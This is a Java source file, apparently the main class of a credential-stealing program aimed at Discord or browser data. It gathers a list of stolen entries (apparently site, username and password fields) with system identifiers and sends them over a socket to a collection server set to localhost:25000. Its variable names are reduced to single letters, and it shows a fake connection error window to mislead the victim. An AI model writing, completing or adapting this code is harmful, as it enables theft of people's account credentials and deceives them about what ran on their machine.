package me.mafrans.discordsw;

import me.mafrans.discordsw.stealer.A;
import me.mafrans.discordsw.stealer.B;

import java.io.*;
import java.net.Socket;
import java.util.List;

public class Main {
    private static Socket a;
    public static D b;

    public static void main(String[] args) {
        try {
            String c = "localhost";
            int d = 25000;
            a = new Socket(c, d);

            OutputStream e = a.getOutputStream();
            OutputStreamWriter f = new OutputStreamWriter(e);
            BufferedWriter g = new BufferedWriter(f);

            b = new D();
            b.initialize();

            List<A> h = B.s();

            StringBuilder i = new StringBuilder();
            i.append(b.n + C.c().replace(" ", "") + "||||||");
            for(A j : h) {
                i.append(j.x + ":||");
                i.append(b.o + j.y + "||");
                i.append(b.p + j.z + "||||");
            }

            g.write(i.toString());
            g.flush();
            a.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        ErrorWindow.run("Error when establishing connection, code:0003");
    }
}
